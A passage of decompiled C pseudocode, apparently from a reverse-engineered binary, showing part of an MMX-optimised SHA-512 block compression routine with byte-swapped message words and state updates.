                 _m_pxor(_m_psllqi(v619, 6u), _m_pxor(_m_pxor(_m_pxor(v618, v617), v619), _m_psrlqi(v617, 5u))));
        v622 = _m_psrlqi(v614, 0xEu);
        v852 = v614;
        v623 = _m_pand(_m_pxor(v860, v869), v614);
        v624 = _m_psllqi(v614, 0x17u);
        v625 = _mm_add_si64(v621, v613);
        v626 = v622;
        v627 = _m_psrlqi(v622, 4u);
        v628 = _m_pxor(v626, v624);
        v629 = _m_psllqi(v624, 0x17u);
        v820 = v625;
        v630 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v628, v627), v629), _m_psrlqi(v627, 0x17u)), _m_psllqi(v629, 4u)),
                 _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[3] + 1), _m_pxor(v623, v869)), v812));
        v631 = _mm_add_si64(v844, v630);
        v632 = _m_psrlqi(v625, 0x1Cu);
        v633 = _m_psllqi(v625, 0x19u);
        v634 = _m_psrlqi(v632, 6u);
        v635 = _m_pxor(v632, v633);
        v636 = _m_psllqi(v633, 5u);
        v637 = _m_pxor(v625, v828);
        v638 = _mm_add_si64(
                 _m_pxor(_m_pand(v620, v637), v828),
                 _m_pxor(_m_psllqi(v636, 6u), _m_pxor(_m_pxor(_m_pxor(v635, v634), v636), _m_psrlqi(v634, 5u))));
        v873[3] = _mm_add_epi64(_mm_load_si128(v2 + 3), v119);
        v639 = v604;
        v123 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 5), v604);
        v640 = _m_psrlqi(v631, 0xEu);
        v845 = v631;
        v641 = _m_pand(_m_pxor(v852, v860), v631);
        v642 = _m_psllqi(v631, 0x17u);
        v643 = _mm_add_si64(v638, v630);
        v644 = v640;
        v645 = _m_psrlqi(v640, 4u);
        v646 = _m_pxor(v644, v642);
        v647 = _m_psllqi(v642, 0x17u);
        v813 = v643;
        v648 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v646, v645), v647), _m_psrlqi(v645, 0x17u)), _m_psllqi(v647, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v874.m128i_u64[0], _m_pxor(v641, v860)), v869));
        v649 = _mm_add_si64(v836, v648);
        v650 = _m_psrlqi(v643, 0x1Cu);
        v651 = _m_psllqi(v643, 0x19u);
        v652 = _m_psrlqi(v650, 6u);
        v653 = _m_pxor(v650, v651);
        v654 = _m_psllqi(v651, 5u);
        v655 = _m_pxor(v643, v820);
        v656 = _mm_add_si64(
                 _m_pxor(_m_pand(v637, v655), v820),
                 _m_pxor(_m_psllqi(v654, 6u), _m_pxor(_m_pxor(_m_pxor(v653, v652), v654), _m_psrlqi(v652, 5u))));
        v657 = _m_psrlqi(v649, 0xEu);
        v837 = v649;
        v658 = _m_pand(_m_pxor(v845, v852), v649);
        v659 = _m_psllqi(v649, 0x17u);
        v660 = _mm_add_si64(v656, v648);
        v661 = v657;
        v662 = _m_psrlqi(v657, 4u);
        v663 = _m_pxor(v661, v659);
        v664 = _m_psllqi(v659, 0x17u);
        v870 = v660;
        v665 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v663, v662), v664), _m_psrlqi(v662, 0x17u)), _m_psllqi(v664, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v874.m128i_u64[1], _m_pxor(v658, v852)), v860));
        v666 = _mm_add_si64(v828, v665);
        v667 = _m_psrlqi(v660, 0x1Cu);
        v668 = _m_psllqi(v660, 0x19u);
        v669 = _m_psrlqi(v667, 6u);
        v670 = _m_pxor(v667, v668);
        v671 = _m_psllqi(v668, 5u);
        v672 = _m_pxor(v660, v813);
        v673 = _mm_add_si64(
                 _m_pxor(_m_pand(v655, v672), v813),
                 _m_pxor(_m_psllqi(v671, 6u), _m_pxor(_m_pxor(_m_pxor(v670, v669), v671), _m_psrlqi(v669, 5u))));
        v874 = _mm_add_epi64(_mm_load_si128(v2 + 4), v121);
        v878 = v496;
        v674 = v639;
        v125 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 6), v639);
        v675 = _m_psrlqi(v666, 0xEu);
        v829 = v666;
        v676 = _m_pand(_m_pxor(v837, v845), v666);
        v677 = _m_psllqi(v666, 0x17u);
        v678 = _mm_add_si64(v673, v665);
        v679 = v675;
        v680 = _m_psrlqi(v675, 4u);
        v681 = _m_pxor(v679, v677);
        v682 = _m_psllqi(v677, 0x17u);
        v861 = v678;
        v683 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v681, v680), v682), _m_psrlqi(v680, 0x17u)), _m_psllqi(v682, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v875.m128i_u64[0], _m_pxor(v676, v845)), v852));
        v684 = _mm_add_si64(v820, v683);
        v685 = _m_psrlqi(v678, 0x1Cu);
        v686 = _m_psllqi(v678, 0x19u);
        v687 = _m_psrlqi(v685, 6u);
        v688 = _m_pxor(v685, v686);
        v689 = _m_psllqi(v686, 5u);
        v690 = _m_pxor(v678, v870);
        v691 = _mm_add_si64(
                 _m_pxor(_m_pand(v672, v690), v870),
                 _m_pxor(_m_psllqi(v689, 6u), _m_pxor(_m_pxor(_m_pxor(v688, v687), v689), _m_psrlqi(v687, 5u))));
        v692 = _m_psrlqi(v684, 0xEu);
        v821 = v684;
        v693 = _m_pand(_m_pxor(v829, v837), v684);
        v694 = _m_psllqi(v684, 0x17u);
        v695 = _mm_add_si64(v691, v683);
        v696 = v692;
        v697 = _m_psrlqi(v692, 4u);
        v698 = _m_pxor(v696, v694);
        v699 = _m_psllqi(v694, 0x17u);
        v853 = v695;
        v700 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v698, v697), v699), _m_psrlqi(v697, 0x17u)), _m_psllqi(v699, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v875.m128i_u64[1], _m_pxor(v693, v837)), v845));
        v701 = _mm_add_si64(v813, v700);
        v702 = _m_psrlqi(v695, 0x1Cu);
        v703 = _m_psllqi(v695, 0x19u);
        v704 = _m_psrlqi(v702, 6u);
        v705 = _m_pxor(v702, v703);
        v706 = _m_psllqi(v703, 5u);
        v707 = _m_pxor(v695, v861);
        v708 = _mm_add_si64(
                 _m_pxor(_m_pand(v690, v707), v861),
                 _m_pxor(_m_psllqi(v706, 6u), _m_pxor(_m_pxor(_m_pxor(v705, v704), v706), _m_psrlqi(v704, 5u))));
        v875 = _mm_add_epi64(_mm_load_si128(v2 + 5), v123);
        v879 = v498;
        v126 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 7), v674);
        v709 = _m_psrlqi(v701, 0xEu);
        v814 = v701;
        v710 = _m_pand(_m_pxor(v821, v829), v701);
        v711 = _m_psllqi(v701, 0x17u);
        v712 = _mm_add_si64(v708, v700);
        v713 = v709;
        v714 = _m_psrlqi(v709, 4u);
        v715 = _m_pxor(v713, v711);
        v716 = _m_psllqi(v711, 0x17u);
        v846 = v712;
        v717 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v715, v714), v716), _m_psrlqi(v714, 0x17u)), _m_psllqi(v716, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v876.m128i_u64[0], _m_pxor(v710, v829)), v837));
        v718 = _mm_add_si64(v870, v717);
        v719 = _m_psrlqi(v712, 0x1Cu);
        v720 = _m_psllqi(v712, 0x19u);
        v721 = _m_psrlqi(v719, 6u);
        v722 = _m_pxor(v719, v720);
        v723 = _m_psllqi(v720, 5u);
        v724 = _m_pxor(v712, v853);
        v725 = _mm_add_si64(
                 _m_pxor(_m_pand(v707, v724), v853),
                 _m_pxor(_m_psllqi(v723, 6u), _m_pxor(_m_pxor(_m_pxor(v722, v721), v723), _m_psrlqi(v721, 5u))));
        v726 = _m_psrlqi(v718, 0xEu);
        v871 = v718;
        v727 = _m_pand(_m_pxor(v814, v821), v718);
        v728 = _m_psllqi(v718, 0x17u);
        v729 = _mm_add_si64(v725, v717);
        v730 = v726;
        v731 = _m_psrlqi(v726, 4u);
        v732 = _m_pxor(v730, v728);
        v733 = _m_psllqi(v728, 0x17u);
        v838 = v729;
        v734 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v732, v731), v733), _m_psrlqi(v731, 0x17u)), _m_psllqi(v733, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v876.m128i_u64[1], _m_pxor(v727, v821)), v829));
        v735 = _mm_add_si64(v861, v734);
        v736 = _m_psrlqi(v729, 0x1Cu);
        v737 = _m_psllqi(v729, 0x19u);
        v738 = _m_psrlqi(v736, 6u);
        v739 = _m_pxor(v736, v737);
        v740 = _m_psllqi(v737, 5u);
        v741 = _m_pxor(v729, v846);
        v742 = _mm_add_si64(
                 _m_pxor(_m_pand(v724, v741), v846),
                 _m_pxor(_m_psllqi(v740, 6u), _m_pxor(_m_pxor(_m_pxor(v739, v738), v740), _m_psrlqi(v738, 5u))));
        v876 = _mm_add_epi64(_mm_load_si128(v2 + 6), v125);
        v880 = v534;
        v127 = _mm_load_si128(&v878);
        v743 = _m_psrlqi(v735, 0xEu);
        v862 = v735;
        v744 = _m_pand(_m_pxor(v871, v814), v735);
        v745 = _m_psllqi(v735, 0x17u);
        v746 = _mm_add_si64(v742, v734);
        v747 = v743;
        v748 = _m_psrlqi(v743, 4u);
        v749 = _m_pxor(v747, v745);
        v750 = _m_psllqi(v745, 0x17u);
        v830 = v746;
        v751 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v749, v748), v750), _m_psrlqi(v748, 0x17u)), _m_psllqi(v750, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v877.m128i_u64[0], _m_pxor(v744, v814)), v821));
        v752 = _mm_add_si64(v853, v751);
        v753 = _m_psrlqi(v746, 0x1Cu);
        v754 = _m_psllqi(v746, 0x19u);
        v755 = _m_psrlqi(v753, 6u);
        v756 = _m_pxor(v753, v754);
        v757 = _m_psllqi(v754, 5u);
        v758 = _m_pxor(v746, v838);
        v759 = _mm_add_si64(
                 _m_pxor(_m_pand(v741, v758), v838),
                 _m_pxor(_m_psllqi(v757, 6u), _m_pxor(_m_pxor(_m_pxor(v756, v755), v757), _m_psrlqi(v755, 5u))));
        v760 = _m_psrlqi(v752, 0xEu);
        v854 = v752;
        v761 = _m_pand(_m_pxor(v862, v871), v752);
        v762 = _m_psllqi(v752, 0x17u);
        v763 = _mm_add_si64(v759, v751);
        v764 = v760;
        v765 = _m_psrlqi(v760, 4u);
        v766 = _m_pxor(v764, v762);
        v767 = _m_psllqi(v762, 0x17u);
        v822 = v763;
        v768 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v766, v765), v767), _m_psrlqi(v765, 0x17u)), _m_psllqi(v767, 4u)),
                 _mm_add_si64(_mm_add_si64((__m64)v877.m128i_u64[1], _m_pxor(v761, v871)), v814));
        v769 = _mm_add_si64(v846, v768);
        v770 = _m_psrlqi(v763, 0x1Cu);
        v771 = _m_psllqi(v763, 0x19u);
        v772 = _m_psrlqi(v770, 6u);
        v773 = _m_pxor(v770, v771);
        v774 = _m_psllqi(v771, 5u);
        v775 = _m_pxor(v763, v830);
        v877 = _mm_add_epi64(_mm_load_si128(v2 + 7), v126);
        v4 = _mm_add_si64(
               _mm_add_si64(
                 _mm_add_si64(
                   _m_pxor(_m_pand(v758, v775), v830),
                   _m_pxor(_m_psllqi(v774, 6u), _m_pxor(_m_pxor(_m_pxor(v773, v772), v774), _m_psrlqi(v772, 5u)))),
                 v768),
               (__m64)v0->m64_u64);
        v5 = _mm_add_si64(v822, v0[1]);
        v6 = _mm_add_si64(_m_pxor(v775, v822), v0[2]);
        v7 = _mm_add_si64(v838, v0[3]);
        v8 = _mm_add_si64(v769, v0[4]);
        v9 = _mm_add_si64(v854, v0[5]);
        v10 = _mm_add_si64(v862, v0[6]);
        v11 = _mm_add_si64(v871, v0[7]);
        v0->m64_u64 = (unsigned __int64)v4;
        v0[1].m64_u64 = (unsigned __int64)v5;
        v0[2].m64_u64 = (unsigned __int64)v6;
        v0[3].m64_u64 = (unsigned __int64)v7;
        v0[4].m64_u64 = (unsigned __int64)v8;
        v0[5].m64_u64 = (unsigned __int64)v9;
        v0[6].m64_u64 = (unsigned __int64)v10;
        v0[7].m64_u64 = (unsigned __int64)v11;
      }
      while ( (unsigned int)v1 < result );
    }
    else
    {
      do
      {
        v877.m128i_u64[1] = (unsigned __int64)v5;
        v878.m128i_u64[0] = (unsigned __int64)v6;
        v878.m128i_u64[1] = (unsigned __int64)v7;
        v879.m128i_u64[1] = (unsigned __int64)v9;
        v880.m128i_u64[0] = (unsigned __int64)v10;
        v12 = _m_pxor(v6, v5);
        v880.m128i_u64[1] = (unsigned __int64)v11;
        v13 = v4;
        v14 = *v1;
        v15 = v1[1];
        v1 += 2;
        v16 = 15;
        v17 = _byteswap_ulong(v14);
        v18 = _byteswap_ulong(v15);
        do
        {
          v19 = _mm_cvtsi32_si64(v17);
          v20 = *v1;
          v21 = _mm_cvtsi32_si64(v18);
          v22 = v1[1];
          v1 += 2;
          v17 = _byteswap_ulong(v20);
          v18 = _byteswap_ulong(v22);
          v23 = _m_punpckldq(v21, v19);
          v24 = _m_psrlqi(v8, 0xEu);
          v879.m128i_u64[0] = (unsigned __int64)v8;
          v25 = _m_pand(_m_pxor(v9, v10), v8);
          v26 = _m_psllqi(v8, 0x17u);
          v27 = v13;
          v881.m128i_u64[1] = (unsigned __int64)v23;
          v28 = v24;
          v29 = _m_psrlqi(v24, 4u);
          v30 = _m_pxor(v28, v26);
          v31 = _m_psllqi(v26, 0x17u);
          v877.m128i_u64[0] = (unsigned __int64)v27;
          v32 = _mm_add_si64(
                  _m_pxor(_m_pxor(_m_pxor(_m_pxor(v30, v29), v31), _m_psrlqi(v29, 0x17u)), _m_psllqi(v31, 4u)),
                  _mm_add_si64(
                    _mm_add_si64(_mm_add_si64(v23, _m_pxor(v25, v10)), (__m64)v880.m128i_u64[1]),
                    (__m64)v2->m128i_u64[0]));
          v8 = _mm_add_si64((__m64)v878.m128i_u64[1], v32);
          v33 = _m_psrlqi(v27, 0x1Cu);
          v34 = _m_psllqi(v27, 0x19u);
          v35 = _m_psrlqi(v33, 6u);
          v36 = _m_pxor(v33, v34);
          v37 = _m_psllqi(v34, 5u);
          v38 = _m_pxor(v27, (__m64)v877.m128i_u64[1]);
          v39 = _m_pxor(_m_psllqi(v37, 6u), _m_pxor(_m_pxor(_m_pxor(v36, v35), v37), _m_psrlqi(v35, 5u)));
          v9 = (__m64)v879.m128i_u64[0];
          v40 = _mm_add_si64(v32, _m_pxor(_m_pand(v12, v38), (__m64)v877.m128i_u64[1]));
          v12 = v38;
          v2 = (const __m128i *)((char *)v2 + 8);
          v13 = _mm_add_si64(v40, v39);
          v10 = (__m64)v879.m128i_u64[1];
          --v16;
        }
        while ( v16 );
        v41 = _m_psrlqi(v8, 0xEu);
        v878.m128i_u64[1] = (unsigned __int64)v8;
        v42 = _m_pand(_m_pxor((__m64)v879.m128i_u64[0], (__m64)v879.m128i_u64[1]), v8);
        v43 = _m_psllqi(v8, 0x17u);
        v44 = v13;
        v881.m128i_u64[0] = (unsigned __int64)_m_punpckldq(_mm_cvtsi32_si64(v18), _mm_cvtsi32_si64(v17));
        v45 = v41;
        v46 = _m_psrlqi(v41, 4u);
        v47 = _m_pxor(v45, v43);
        v48 = _m_psllqi(v43, 0x17u);
        v876.m128i_u64[1] = (unsigned __int64)v44;
        v49 = _mm_add_si64(
                _m_pxor(_m_pxor(_m_pxor(_m_pxor(v47, v46), v48), _m_psrlqi(v46, 0x17u)), _m_psllqi(v48, 4u)),
                _mm_add_si64(
                  _mm_add_si64(
                    _mm_add_si64((__m64)v881.m128i_u64[0], _m_pxor(v42, (__m64)v879.m128i_u64[1])),
                    (__m64)v880.m128i_u64[0]),
                  (__m64)v2->m128i_u64[0]));
        v50 = _mm_add_si64((__m64)v878.m128i_u64[0], v49);
        v51 = _m_psrlqi(v44, 0x1Cu);
        v52 = _m_psllqi(v44, 0x19u);
        v53 = _m_psrlqi(v51, 6u);
        v54 = _m_pxor(v51, v52);
        v55 = _m_psllqi(v52, 5u);
        v56 = _m_pxor(v44, (__m64)v877.m128i_u64[0]);
        v57 = _m_pxor(_m_psllqi(v55, 6u), _m_pxor(_m_pxor(_m_pxor(v54, v53), v55), _m_psrlqi(v53, 5u)));
        v58 = v892;
        v59 = _mm_add_si64(v49, _m_pxor(_m_pand(v12, v56), (__m64)v877.m128i_u64[0]));
        v60 = v56;
        v61 = (__m64 *)&v2->m128i_u64[1];
        v62 = _mm_add_si64(v59, v57);
        v63.m64_u64 = 0i64;
        v64 = 32;
        do
        {
          v65 = _m_psllqi(v58, 0x38u);
          v66 = _mm_add_si64(v63, v62);
          v67 = _m_psrlqi(v58, 1u);
          v68 = _m_psrlqi(v67, 6u);
          v69 = _m_pxor(_m_pxor(_m_pxor(v67, v65), v68), _m_psllqi(v65, 7u));
          v70 = _m_psrlqi((__m64)v881.m128i_u64[1], 6u);
          v71 = _m_psrlqi(v70, 0xDu);
          v72 = _m_psllqi((__m64)v881.m128i_u64[1], 3u);
          v73 = _mm_add_si64(
                  _mm_add_si64(_mm_add_si64(_m_pxor(_m_psrlqi(v68, 1u), v69), v893), v888),
                  _m_pxor(_m_pxor(_m_pxor(_m_pxor(v70, v71), v72), _m_psrlqi(v71, 0x2Au)), _m_psllqi(v72, 0x2Au)));
          v74 = _m_psrlqi(v50, 0xEu);
          v878.m128i_u64[0] = (unsigned __int64)v50;
          v75 = _m_pand(_m_pxor((__m64)v878.m128i_u64[1], (__m64)v879.m128i_u64[0]), v50);
          v76 = _m_psllqi(v50, 0x17u);
          v880.m128i_u64[1] = (unsigned __int64)v73;
          v77 = v74;
          v78 = _m_psrlqi(v74, 4u);
          v79 = _m_pxor(v77, v76);
          v80 = _m_psllqi(v76, 0x17u);
          v876.m128i_u64[0] = (unsigned __int64)v66;
          v81 = _mm_add_si64(
                  _m_pxor(_m_pxor(_m_pxor(_m_pxor(v79, v78), v80), _m_psrlqi(v78, 0x17u)), _m_psllqi(v80, 4u)),
                  _mm_add_si64(
                    _mm_add_si64(_mm_add_si64(v73, _m_pxor(v75, (__m64)v879.m128i_u64[0])), (__m64)v879.m128i_u64[1]),
                    (__m64)v61->m64_u64));
          v82 = _mm_add_si64((__m64)v877.m128i_u64[1], v81);
          v83 = _m_psrlqi(v66, 0x1Cu);
          v84 = _m_psllqi(v66, 0x19u);
          v85 = _m_psrlqi(v83, 6u);
          v86 = _m_pxor(v83, v84);
          v87 = _m_psllqi(v84, 5u);
          v88 = _m_pxor(v66, (__m64)v876.m128i_u64[1]);
          v89 = v61 + 1;
          v90 = _m_psllqi(v891, 0x38u);
          v91 = _mm_add_si64(
                  _mm_add_si64(
                    _m_pxor(_m_pand(v60, v88), (__m64)v876.m128i_u64[1]),
                    _m_pxor(_m_psllqi(v87, 6u), _m_pxor(_m_pxor(_m_pxor(v86, v85), v87), _m_psrlqi(v85, 5u)))),
                  v81);
          v92 = _m_psrlqi(v891, 1u);
          v93 = _m_psrlqi(v92, 6u);
          v94 = _m_pxor(_m_pxor(_m_pxor(v92, v90), v93), _m_psllqi(v90, 7u));
          v95 = _m_psrlqi((__m64)v881.m128i_u64[0], 6u);
          v96 = _m_psrlqi(v95, 0xDu);
          v97 = _m_psllqi((__m64)v881.m128i_u64[0], 3u);
          v98 = _mm_add_si64(
                  _mm_add_si64(_mm_add_si64(_m_pxor(_m_psrlqi(v93, 1u), v94), v892), v887),
                  _m_pxor(_m_pxor(_m_pxor(_m_pxor(v95, v96), v97), _m_psrlqi(v96, 0x2Au)), _m_psllqi(v97, 0x2Au)));
          v99 = _m_psrlqi(v82, 0xEu);
          v877.m128i_u64[1] = (unsigned __int64)v82;
          v100 = _m_pand(_m_pxor((__m64)v878.m128i_u64[0], (__m64)v878.m128i_u64[1]), v82);
          v101 = _m_psllqi(v82, 0x17u);
          v880.m128i_u64[0] = (unsigned __int64)v98;
          v102 = v99;
          v103 = _m_psrlqi(v99, 4u);
          v104 = _m_pxor(v102, v101);
          v105 = _m_psllqi(v101, 0x17u);
          v875.m128i_u64[1] = (unsigned __int64)v91;
          v62 = _mm_add_si64(
                  _m_pxor(_m_pxor(_m_pxor(_m_pxor(v104, v103), v105), _m_psrlqi(v103, 0x17u)), _m_psllqi(v105, 4u)),
                  _mm_add_si64(
                    _mm_add_si64(_mm_add_si64(v98, _m_pxor(v100, (__m64)v878.m128i_u64[1])), (__m64)v879.m128i_u64[0]),
                    (__m64)v89->m64_u64));
          v50 = _mm_add_si64((__m64)v877.m128i_u64[0], v62);
          v106 = _m_psrlqi(v91, 0x1Cu);
          v107 = _m_psllqi(v91, 0x19u);
          v108 = _m_psrlqi(v106, 6u);
          v109 = _m_pxor(v106, v107);
          v110 = _m_psllqi(v107, 5u);
          v60 = _m_pxor(v91, (__m64)v876.m128i_u64[0]);
          v111 = _m_pxor(_m_psllqi(v110, 6u), _m_pxor(_m_pxor(_m_pxor(v109, v108), v110), _m_psrlqi(v108, 5u)));
          v58 = v890;
          v63 = _mm_add_si64(_m_pxor(_m_pand(v88, v60), (__m64)v876.m128i_u64[0]), v111);
          v61 = v89 + 1;
          --v64;
        }
        while ( v64 );
        v4 = _mm_add_si64(_mm_add_si64(v63, v62), (__m64)v0->m64_u64);
        v5 = _mm_add_si64((__m64)v875.m128i_u64[1], v0[1]);
        v6 = _mm_add_si64(_m_pxor(v60, (__m64)v875.m128i_u64[1]), v0[2]);
        v7 = _mm_add_si64((__m64)v876.m128i_u64[1], v0[3]);
        v8 = _mm_add_si64(v50, v0[4]);
        v9 = _mm_add_si64((__m64)v877.m128i_u64[1], v0[5]);
        v10 = _mm_add_si64((__m64)v878.m128i_u64[0], v0[6]);
        v11 = _mm_add_si64((__m64)v878.m128i_u64[1], v0[7]);
        result = 640;
        v0->m64_u64 = (unsigned __int64)v4;
        v0[1].m64_u64 = (unsigned __int64)v5;
        v0[2].m64_u64 = (unsigned __int64)v6;
        v0[3].m64_u64 = (unsigned __int64)v7;
        v0[4].m64_u64 = (unsigned __int64)v8;
        v0[5].m64_u64 = (unsigned __int64)v9;
        v0[6].m64_u64 = (unsigned __int64)v10;
        v0[7].m64_u64 = (unsigned __int64)v11;
        v2 = (const __m128i *)&v61[-80];
      }
      while ( (unsigned int)v1 < v880.m128i_i32[2] );
    }
    _m_empty();
  }
  else
  {
    do
    {
      v776 = _byteswap_ulong(v1[2]);
      v777 = _byteswap_ulong(v1[3]);
      v881.m128i_i64[1] = __PAIR64__(_byteswap_ulong(*v1), _byteswap_ulong(v1[1]));
      v881.m128i_i64[0] = __PAIR64__(v776, v777);
      v778 = _byteswap_ulong(v1[6]);
      v779 = _byteswap_ulong(v1[7]);
      v880.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[4]), _byteswap_ulong(v1[5]));
      v880.m128i_i64[0] = __PAIR64__(v778, v779);
      v780 = _byteswap_ulong(v1[10]);
      v781 = _byteswap_ulong(v1[11]);
      v879.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[8]), _byteswap_ulong(v1[9]));
      v879.m128i_i64[0] = __PAIR64__(v780, v781);
      v782 = _byteswap_ulong(v1[14]);
      v783 = _byteswap_ulong(v1[15]);
      v878.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[12]), _byteswap_ulong(v1[13]));
      v878.m128i_i64[0] = __PAIR64__(v782, v783);
      v784 = _byteswap_ulong(v1[18]);
      v785 = _byteswap_ulong(v1[19]);
      v877.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[16]), _byteswap_ulong(v1[17]));
      v877.m128i_i64[0] = __PAIR64__(v784, v785);
      v786 = _byteswap_ulong(v1[22]);
      v787 = _byteswap_ulong(v1[23]);
      v876.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[20]), _byteswap_ulong(v1[21]));
      v876.m128i_i64[0] = __PAIR64__(v786, v787);
      v788 = _byteswap_ulong(v1[26]);
      v789 = _byteswap_ulong(v1[27]);
      v875.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[24]), _byteswap_ulong(v1[25]));
      v875.m128i_i64[0] = __PAIR64__(v788, v789);
      v790 = _byteswap_ulong(v1[30]);
      v791 = _byteswap_ulong(v1[31]);
      v874.m128i_i64[1] = __PAIR64__(_byteswap_ulong(v1[28]), _byteswap_ulong(v1[29]));
      v874.m128i_i64[0] = __PAIR64__(v790, v791);
      v883 = (unsigned int)(v1 + 32);
      qmemcpy(v873, v0, sizeof(v873));
      do
      {
        HIDWORD(v793) = (v881.m128i_i64[1]
                       + *((_QWORD *)&v873[3] + 1)
                       + __PAIR64__(
                           (DWORD1(v873[2]) << 23) ^ (DWORD1(v873[2]) >> 18) ^ (LODWORD(v873[2]) << 18) ^ (DWORD1(v873[2]) >> 14) ^ (LODWORD(v873[2]) << 14) ^ (LODWORD(v873[2]) >> 9),
                           (LODWORD(v873[2]) << 23) ^ (LODWORD(v873[2]) >> 18) ^ (DWORD1(v873[2]) << 18) ^ (LODWORD(v873[2]) >> 14) ^ (DWORD1(v873[2]) << 14) ^ (DWORD1(v873[2]) >> 9))) >> 32;
        LODWORD(v792) = v881.m128i_i32[2]
                      + DWORD2(v873[3])
                      + ((LODWORD(v873[2]) << 23) ^ (LODWORD(v873[2]) >> 18) ^ (DWORD1(v873[2]) << 18) ^ (LODWORD(v873[2]) >> 14) ^ (DWORD1(v873[2]) << 14) ^ (DWORD1(v873[2]) >> 9));
        LODWORD(v793) = LODWORD(v873[3]) ^ v873[2] & (LODWORD(v873[3]) ^ DWORD2(v873[2]));
        HIDWORD(v792) = DWORD1(v873[3]) ^ DWORD1(v873[2]) & (DWORD1(v873[3]) ^ HIDWORD(v873[2]));
        v794 = v793 + v792;
        HIDWORD(v792) = HIDWORD(v873[1]);
        LODWORD(v793) = DWORD2(v873[1]);
        HIDWORD(v793) = (unsigned __int64)(v2->m128i_i64[0] + v794) >> 32;
        LODWORD(v792) = v2->m128i_i32[0] + v794;
        *((_QWORD *)&v873[1] + 1) = v793 + v792;
        HIDWORD(v793) = (__PAIR64__(HIDWORD(v793), v792)
                       + __PAIR64__(
                           (DWORD1(v873[0]) << 30) ^ (DWORD1(v873[0]) >> 28) ^ (DWORD1(v873[0]) << 25) ^ (LODWORD(v873[0]) >> 7) ^ (16 * LODWORD(v873[0])) ^ (LODWORD(v873[0]) >> 2),
                           (LODWORD(v873[0]) << 30) ^ (LODWORD(v873[0]) >> 28) ^ (LODWORD(v873[0]) << 25) ^ (DWORD1(v873[0]) >> 7) ^ (16 * DWORD1(v873[0])) ^ (DWORD1(v873[0]) >> 2))) >> 32;
        LODWORD(v792) = v792
                      + ((LODWORD(v873[0]) << 30) ^ (LODWORD(v873[0]) >> 28) ^ (LODWORD(v873[0]) << 25) ^ (DWORD1(v873[0]) >> 7) ^ (16 * DWORD1(v873[0])) ^ (DWORD1(v873[0]) >> 2));
        LODWORD(v793) = v873[0] & DWORD2(v873[0]) | v873[1] & (DWORD2(v873[0]) | LODWORD(v873[0]));
        HIDWORD(v792) = DWORD1(v873[0]) & HIDWORD(v873[0]) | DWORD1(v873[1]) & (HIDWORD(v873[0]) | DWORD1(v873[0]));
        v872 = v793 + v792;
        BYTE4(v792) = v2->m128i_i8[0];
        v2 = (const __m128i *)((char *)v2 + 8);
      }
      while ( BYTE4(v792) != 0x94 );
      do
      {
        LODWORD(v795) = v894;
        HIDWORD(v796) = v895;
        HIDWORD(v795) = (__PAIR64__(
                           ((unsigned __int32)v893.m64_i32[1] >> 8) ^ (v893.m64_i32[0] << 31) ^ ((unsigned __int32)v893.m64_i32[1] >> 7) ^ (v893.m64_i32[0] << 24) ^ ((unsigned __int32)v893.m64_i32[1] >> 1),
                           (v893.m64_i32[1] << 31) ^ ((unsigned __int32)v893.m64_i32[0] >> 8) ^ (v893.m64_i32[1] << 25) ^ ((unsigned __int32)v893.m64_i32[0] >> 7) ^ (v893.m64_i32[1] << 24) ^ ((unsigned __int32)v893.m64_i32[0] >> 1))
                       + __PAIR64__(
                           (v882 >> 29) ^ (v882 << 13) ^ (v883 >> 19) ^ (8 * v883) ^ (v883 >> 6),
                           (v883 << 26) ^ (v883 >> 29) ^ (v883 << 13) ^ (v882 >> 19) ^ (8 * v882) ^ (v882 >> 6))) >> 32;
        LODWORD(v796) = ((v893.m64_i32[1] << 31) ^ ((unsigned __int32)v893.m64_i32[0] >> 8) ^ (v893.m64_i32[1] << 25) ^ ((unsigned __int32)v893.m64_i32[0] >> 7) ^ (v893.m64_i32[1] << 24) ^ ((unsigned __int32)v893.m64_i32[0] >> 1))
                      + ((v883 << 26) ^ (v883 >> 29) ^ (v883 << 13) ^ (v882 >> 19) ^ (8 * v882) ^ (v882 >> 6));
        v881.m128i_i64[0] = v889 + v795 + v796;
        HIDWORD(v795) = (v881.m128i_i64[0]
                       + *(_QWORD *)&v873[3]
                       + __PAIR64__(
                           (HIDWORD(v873[1]) << 23) ^ (HIDWORD(v873[1]) >> 18) ^ (DWORD2(v873[1]) << 18) ^ (HIDWORD(v873[1]) >> 14) ^ (DWORD2(v873[1]) << 14) ^ (DWORD2(v873[1]) >> 9),
                           (DWORD2(v873[1]) << 23) ^ (DWORD2(v873[1]) >> 18) ^ (HIDWORD(v873[1]) << 18) ^ (DWORD2(v873[1]) >> 14) ^ (HIDWORD(v873[1]) << 14) ^ (HIDWORD(v873[1]) >> 9))) >> 32;
        LODWORD(v796) = v881.m128i_i32[0]
                      + LODWORD(v873[3])
